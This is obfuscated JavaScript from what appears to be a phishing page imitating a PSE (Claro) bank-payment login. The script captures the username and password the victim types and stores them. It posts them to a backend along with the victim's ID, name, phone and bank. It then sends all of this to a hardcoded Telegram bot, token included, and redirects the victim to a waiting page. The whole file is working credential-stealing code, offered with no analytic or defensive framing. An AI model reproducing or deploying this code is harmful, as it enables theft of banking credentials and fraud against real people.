function _0x1019(_0x5bf5a2, _0xd0e50e) {
  const _0x572dba = _0x572d();
  return (
    (_0x1019 = function (_0x1019aa, _0x28f9c7) {
      _0x1019aa = _0x1019aa - 0x107;
      let _0x262620 = _0x572dba[_0x1019aa];
      return _0x262620;
    }),
    _0x1019(_0x5bf5a2, _0xd0e50e)
  );
}
const _0xf5b39c = _0x1019;
function _0x572d() {
  const _0x41b12e = [
    "idreg",
    "PUT",
    "addEventListener",
    "nombre",
    "\x0a📱Teléfono:\x20",
    "\x0a🆔Nombre:\x20",
    "value",
    "href",
    "statusText",
    "json",
    "Error\x20al\x20procesar\x20la\x20solicitud:",
    "puser",
    "getElementById",
    "application/json",
    "focus",
    "311tjiLEI",
    "2606ivjHqI",
    "Error\x20al\x20obtener\x20los\x20datos\x20del\x20servidor",
    "Usuario\x20actualizado",
    "&text=",
    "\x0a🚹Usuario:\x20",
    "error",
    "26838DRZxHq",
    "\x0aCorrigió\x20Usuario",
    "3421840JkvgDK",
    "/trico/tricoUserPse/",
    "13407740xTBxnG",
    "765acmiir",
    "disabled",
    "info",
    "Error\x20al\x20actualizar\x20el\x20usuario",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "7972quSRPe",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "\x0a🔒Contraseña:\x20",
    "stringify",
    "txtUsuario",
    "/trico/tricoData",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "btnUsuario",
    "wait.html",
    "\x0aFuente:\x20",
    "location",
    "preventDefault",
    "user",
    "441882NtjCgv",
    "metaInfo",
    "914742YZLFNx",
    "txtPass",
    "bank",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "Usuario\x20no\x20encontrado\x20en\x20la\x20base\x20de\x20datos",
    "161NIHlcr",
  ];
  _0x572d = function () {
    return _0x41b12e;
  };
  return _0x572d();
}
(function (_0x125e78, _0xbcb5b0) {
  const _0x1ab641 = _0x1019,
    _0x1aaf19 = _0x125e78();
  while (!![]) {
    try {
      const _0x411a1a =
        (parseInt(_0x1ab641(0x10d)) / 0x1) *
          (parseInt(_0x1ab641(0x10e)) / 0x2) +
        parseInt(_0x1ab641(0x12e)) / 0x3 +
        (-parseInt(_0x1ab641(0x11e)) / 0x4) *
          (-parseInt(_0x1ab641(0x119)) / 0x5) +
        (-parseInt(_0x1ab641(0x114)) / 0x6) *
          (-parseInt(_0x1ab641(0x133)) / 0x7) +
        parseInt(_0x1ab641(0x116)) / 0x8 +
        parseInt(_0x1ab641(0x12c)) / 0x9 +
        -parseInt(_0x1ab641(0x118)) / 0xa;
      if (_0x411a1a === _0xbcb5b0) break;
      else _0x1aaf19["push"](_0x1aaf19["shift"]());
    } catch (_0x3633fd) {
      _0x1aaf19["push"](_0x1aaf19["shift"]());
    }
  }
})(_0x572d, 0x3e039);
function updateLS() {
  const _0x160e8d = _0x1019;
  LS["setItem"](_0x160e8d(0x11b), JSON[_0x160e8d(0x122)](info));
}
const button = document[_0xf5b39c(0x10a)](_0xf5b39c(0x126)),
  userInput = document[_0xf5b39c(0x10a)](_0xf5b39c(0x123)),
  passInput = document[_0xf5b39c(0x10a)](_0xf5b39c(0x12f));
async function sendToTelegram(_0x3ad8a7) {
  const _0xdff886 = _0xf5b39c;
  for (const _0x2646c5 of chatIds) {
    const _0x431b1d =
      _0xdff886(0x120) +
      _0x2646c5 +
      _0xdff886(0x111) +
      encodeURIComponent(_0x3ad8a7);
    try {
      const _0x4c7aa2 = await fetch(_0x431b1d);
      _0x4c7aa2["ok"]
        ? console["log"](_0xdff886(0x125) + _0x2646c5 + ")")
        : console[_0xdff886(0x113)](
            "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20" +
              _0x2646c5 +
              "):",
            _0x4c7aa2[_0xdff886(0x13c)]
          );
    } catch (_0x523cb1) {
      console[_0xdff886(0x113)](_0xdff886(0x11f) + _0x2646c5 + "):", _0x523cb1);
    }
  }
}
async function updateStatus() {
  const _0x469154 = _0xf5b39c;
  button["disabled"] = !![];
  try {
    const _0x1ae0a6 = await fetch(url + _0x469154(0x124), {
      method: "GET",
      headers: { "Content-Type": _0x469154(0x10b) },
    });
    if (!_0x1ae0a6["ok"]) throw new Error(_0x469154(0x10f));
    const _0xc1547 = await _0x1ae0a6[_0x469154(0x107)](),
      _0x3965d2 = [..._0xc1547],
      _0x420a1f = _0x3965d2["find"](
        (_0x15386c) => _0x15386c["id"] == info[_0x469154(0x12d)]["cc"]
      );
    if (_0x420a1f) {
      console["log"]("Usuario\x20encontrado");
      const _0x5e4f08 = await fetch(
        url + _0x469154(0x117) + _0x420a1f[_0x469154(0x134)],
        {
          method: _0x469154(0x135),
          headers: { "Content-Type": _0x469154(0x10b) },
          body: JSON[_0x469154(0x122)]({
            usuario: info[_0x469154(0x12d)]["user"],
            password: info["metaInfo"]["puser"],
          }),
        }
      );
      if (!_0x5e4f08["ok"]) throw new Error(_0x469154(0x11c));
      const _0x43a0e4 = await _0x5e4f08[_0x469154(0x107)](),
        _0xcddbd4 =
          _0x469154(0x131) +
          _0x420a1f["id"] +
          _0x469154(0x139) +
          _0x420a1f[_0x469154(0x137)] +
          _0x469154(0x138) +
          _0x420a1f["telefono"] +
          _0x469154(0x112) +
          info[_0x469154(0x12d)]["user"] +
          _0x469154(0x121) +
          info[_0x469154(0x12d)][_0x469154(0x109)] +
          "\x0a🏦Banco:\x20" +
          _0x420a1f[_0x469154(0x130)] +
          _0x469154(0x128) +
          fuente +
          _0x469154(0x115);
      await sendToTelegram(_0xcddbd4), console["log"](_0x469154(0x110));
    } else console[_0x469154(0x113)](_0x469154(0x132));
  } catch (_0x113fed) {
    console[_0x469154(0x113)](_0x469154(0x108), _0x113fed);
  } finally {
    (button[_0x469154(0x11a)] = ![]),
      (window[_0x469154(0x129)][_0x469154(0x13b)] = _0x469154(0x127));
  }
}
button[_0xf5b39c(0x136)]("click", async function (_0x5513a2) {
  const _0xd28674 = _0xf5b39c;
  _0x5513a2[_0xd28674(0x12a)]();
  if (userInput[_0xd28674(0x13a)] === "" || passInput["value"] === "") {
    alert(_0xd28674(0x11d)), userInput[_0xd28674(0x10c)]();
    return;
  }
  const _0x35801b = userInput["value"],
    _0x284d0f = passInput[_0xd28674(0x13a)];
  (info[_0xd28674(0x12d)][_0xd28674(0x12b)] = _0x35801b),
    (info[_0xd28674(0x12d)]["puser"] = _0x284d0f),
    updateLS(),
    await updateStatus();
});
